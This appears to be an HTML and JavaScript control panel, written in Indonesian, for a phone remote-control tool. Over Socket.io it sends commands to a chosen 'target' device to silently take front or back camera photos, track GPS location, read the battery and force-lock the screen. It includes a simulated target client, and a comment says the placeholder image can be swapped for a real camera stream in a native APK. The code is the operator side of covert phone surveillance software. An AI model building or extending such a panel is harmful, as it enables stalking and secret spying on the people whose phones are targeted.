<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYNTAX_FORGE // Advanced Remote Control Suite + Camera</title>
    <style>
        :root {
            --bg: #030305;
            --panel: #0d0d12;
            --cyan: #00f3ff;
            --gold: #ffb700;
            --danger: #ff3366;
            --green: #00ff66;
            --text: #c0c0c0;
        }
        body {
            background-color: var(--bg);
            color: var(--text);
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 20px;
        }
        h2 {
            color: var(--cyan);
            text-shadow: 0 0 10px rgba(0, 243, 255, 0.4);
            border-bottom: 1px solid #1a1a24;
            padding-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        .card {
            background-color: var(--panel);
            border: 1px solid #1a1a24;
            border-left: 4px solid var(--cyan);
            padding: 20px;
            border-radius: 4px;
            box-shadow: 0 0 20px rgba(0,0,0,0.6);
        }
        .card h3 {
            margin-top: 0;
            color: var(--gold);
        }
        select, button {
            background: #000;
            color: var(--cyan);
            border: 1px solid var(--cyan);
            padding: 10px;
            width: 100%;
            margin-top: 10px;
            cursor: pointer;
            font-family: inherit;
            box-sizing: border-box;
            transition: 0.2s;
        }
        button:hover {
            background-color: var(--cyan);
            color: #000;
            box-shadow: 0 0 12px var(--cyan);
        }
        .danger-btn {
            border-color: var(--danger);
            color: var(--danger);
        }
        .danger-btn:hover {
            background-color: var(--danger);
            color: #fff;
            box-shadow: 0 0 12px var(--danger);
        }
        .console {
            background: #000;
            border: 1px dashed #333;
            padding: 12px;
            height: 160px;
            overflow-y: auto;
            font-size: 0.85em;
            color: var(--green);
            margin-top: 15px;
        }
        .media-preview {
            margin-top: 15px;
            background: #000;
            border: 1px solid #333;
            padding: 10px;
            text-align: center;
            min-height: 150px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .media-preview img {
            max-width: 100%;
            max-height: 200px;
            border: 1px solid var(--cyan);
        }
        .status-dot {
            height: 12px;
            width: 12px;
            background-color: var(--green);
            border-radius: 50%;
            display: inline-block;
            box-shadow: 0 0 10px var(--green);
        }
    </style>
</head>
<body>

    <h2>
        ⚡ ADVANCED REMOTE SUITE + CAMERA 
        <span style="font-size: 0.5em; display: flex; align-items: center; gap: 8px;">
            Secure Relay Active <span class="status-dot"></span>
        </span>
    </h2>

    <div class="grid">
        <!-- 1. Manajemen Perangkat -->
        <div class="card">
            <h3>1. Target Perangkat</h3>
            <label for="device-select">Pilih Sesi Perangkat:</label>
            <select id="device-select">
                <option value="">-- Menunggu Perangkat Online --</option>
            </select>
            <button onclick="simulateTargetClient()" style="border-color: var(--gold); color: var(--gold);">[Simulasi] Hubungkan HP Target</button>
        </div>

        <!-- 2. Kontrol Kamera & Visual -->
        <div class="card">
            <h3>2. Kontrol Kamera Jarak Jauh</h3>
            <button onclick="sendCommand('TAKE_PHOTO_FRONT')">📸 Ambil Foto (Kamera Depan)</button>
            <button onclick="sendCommand('TAKE_PHOTO_BACK')">📷 Ambil Foto (Kamera Belakang)</button>
            <div class="media-preview" id="media-box">
                <span style="color: #666; font-size: 0.8em;">[Preview Hasil Foto Kamera]</span>
            </div>
        </div>

        <!-- 3. Kontrol Sistem & Hardware -->
        <div class="card">
            <h3>3. Aksi Perangkat & Lokasi</h3>
            <button onclick="sendCommand('GET_LOCATION')">📍 Lacak Lokasi GPS</button>
            <button onclick="sendCommand('GET_BATTERY')">🔋 Cek Baterai & Suhu</button>
            <button class="danger-btn" onclick="sendCommand('LOCK_SCREEN')">🔒 Kunci Layar Paksa</button>
        </div>

        <!-- 4. Log Aktivitas Real-time -->
        <div class="card" style="grid-column: span 1 / -1;">
            <h3>4. Live Terminal & Log Telemetri</h3>
            <div class="console" id="console-log">[SYSTEM] Panel kendali siap. Menunggu perintah kamera...</div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const consoleLog = document.getElementById('console-log');
        const deviceSelect = document.getElementById('device-select');
        const mediaBox = document.getElementById('media-box');

        socket.emit('register-dashboard');

        function logMessage(msg, color = 'var(--green)') {
            const time = new Date().toLocaleTimeString();
            consoleLog.innerHTML += `<br><span style="color:${color}">[${time}] ${msg}</span>`;
            consoleLog.scrollTop = consoleLog.scrollHeight;
        }

        socket.on('device-list-update', (devices) => {
            deviceSelect.innerHTML = '';
            if (devices.length === 0) {
                deviceSelect.innerHTML = '<option value="">-- Tidak ada perangkat online --</option>';
                return;
            }
            devices.forEach(dev => {
                const opt = document.createElement('option');
                opt.value = dev.deviceId;
                opt.textContent = `${dev.deviceName} (${dev.deviceId})`;
                deviceSelect.appendChild(opt);
            });
            logMessage(`Daftar perangkat diperbarui. Total aktif: ${devices.length}`, 'var(--cyan)');
        });

        function sendCommand(action) {
            const targetId = deviceSelect.value;
            if (!targetId) {
                alert('Pilih perangkat target di dropdown terlebih dahulu!');
                return;
            }
            logMessage(`Mengirim perintah: [${action}] ke target ${targetId}`, 'var(--gold)');
            socket.emit('send-command', { targetId, action });
        }

        socket.on('broadcast-response', (res) => {
            logMessage(`[RESPON TARGET] ${res.message}`);
            // Jika respon berisi gambar/base64 data foto
            if (res.imageData) {
                mediaBox.innerHTML = `<img src="${res.imageData}" alt="Captured Photo" /><span style="font-size:0.7em; color:var(--cyan); margin-top:5px;">Berhasil mengambil foto dari target</span>`;
            }
        });

        // Simulasi Klien HP Target (Mendukung aksi kamera)
        function simulateTargetClient() {
            const targetId = 'REDMI_A2_ZEEO';
            const clientSocket = io();
            clientSocket.emit('register-device', { deviceId: targetId, deviceName: 'Redmi A2 (Zeeo)' });

            clientSocket.on('execute-command', (data) => {
                let responseText = '';
                let imageBase64 = null;

                if (data.action === 'TAKE_PHOTO_FRONT' || data.action === 'TAKE_PHOTO_BACK') {
                    responseText = `Kamera ${data.action.includes('FRONT') ? 'Depan' : 'Belakang'} berhasil memotret secara senyap.`;
                    // Contoh gambar placeholder dummy (bisa diganti data stream kamera asli di APK native)
                    imageBase64 = 'https://images.unsplash.com/photo-1550745165-9bc0b252726f?w=400&auto=format&fit=crop&q=60';
                } else if (data.action === 'GET_LOCATION') {
                    responseText = 'Koordinat GPS: -6.2088, 106.8456';
                } else if (data.action === 'GET_BATTERY') {
                    responseText = 'Baterai: 87% (Normal - 31°C)';
                } else {
                    responseText = `Perintah ${data.action} berhasil dieksekusi.`;
                }

                clientSocket.emit('device-response', { 
                    deviceId: targetId, 
                    message: responseText,
                    imageData: imageBase64 
                });
            });
            alert('Simulasi HP Target dengan fitur kamera berhasil diaktifkan!');
        }
    </script>
</body>
</html>
